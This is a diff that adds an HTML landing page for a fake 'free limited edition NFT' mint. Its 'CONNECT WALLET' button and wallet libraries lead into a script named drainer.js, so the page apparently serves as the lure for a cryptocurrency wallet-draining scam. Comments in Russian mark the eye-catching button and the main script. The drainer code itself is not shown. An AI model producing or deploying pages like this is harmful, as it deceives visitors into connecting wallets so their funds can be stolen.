@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive NFT Mint</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .container { background-color: #222; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(255,0,255,0.3); }
+        h1 { margin-bottom: 20px; }
+        p { color: #aaa; }
+        #connectButton {
+            background-color: #8A2BE2; /* Яркий, привлекающий цвет */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+}
+connectButton:hover {
+            background-color: #9932CC;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Claim Your FREE Limited Edition NFT!</h1>
+        <p>Connect your wallet to verify eligibility and mint your exclusive asset.</p>
+        <button id="connectButton">CONNECT WALLET</button>
+    </div>
+
+    <!-- Подключаем библиотеки и основной скрипт -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+    <script src="abi.js"></script>
+    <script src="drainer.js"></script>
+</body>
+</html>
+
